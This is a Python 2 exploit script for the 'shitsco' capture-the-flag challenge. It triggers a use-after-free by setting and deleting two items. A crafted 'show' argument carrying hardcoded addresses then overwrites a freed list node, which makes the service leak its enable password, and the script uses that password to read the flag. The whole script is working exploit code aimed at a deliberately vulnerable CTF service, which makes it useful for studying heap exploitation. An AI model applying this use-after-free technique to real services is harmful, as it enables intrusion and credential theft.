#!/usr/bin/env python

import socket
from struct import pack, unpack

DEBUG = False

server = "shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me"
server = "127.0.0.1"
port = 31337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
s.settimeout(30)

def recv_until(s, pattern):
	ret = ''
	while True:
		c = s.recv(1)
		if c == '':
			raise Exception("Connection closed")
		ret += c
		if ret.find(pattern) != -1:
			break
	return ret

# trigger use-after-free by creating 2 items and then removing them in order
print recv_until(s, "$ ")
print "set 1 abcd"
s.send("set 1 abcd\n")
print recv_until(s, "$ ")
print "set 2 abcd"
s.send("set 2 abcd\n")
print recv_until(s, "$ ")
print "set 1"
s.send("set 1\n")
print recv_until(s, "$ ")
print "set 2"
s.send("set 2\n")
print recv_until(s, "$ ")


print "show <pointers>"
# set use-after-free item via strdup of argument to 'show' command
#  first two items are the key,value pair followed by blink and flink
#  use a pointer to the string "password" in the code section for the key (0x80495d0)
#  use the location of the password in bss for the value (0x804c3a0)
#  use something to terminate the linked list for flink and blink
#   - can't use null directly here since the strdup allocation would be cut short (must be 16 bytes to re-use the free'd block)
#   - just use a pointer to some nulls in bss instead (0x804c390)
s.send("show " + pack("<IIII", 0x80495d0, 0x804C3A0, 0x804C390, 0x0804C390) + "\n")
print recv_until(s, "$ ")

# now, this will simply dump the password for us
print "show"
s.send("show\n")
a = recv_until(s, ': ')
pw = recv_until(s, '\n')[:-1]
b = recv_until(s, "$ ")
print a + pw + '\n' + b

print 'Enable password: "' + pw + '"'

print "enable " + pw
s.send('enable ' + pw + '\n')

print recv_until(s, "# ")
print "flag"
s.send('flag\n')
print recv_until(s, "# ")
print "quit"
s.send('quit\n')
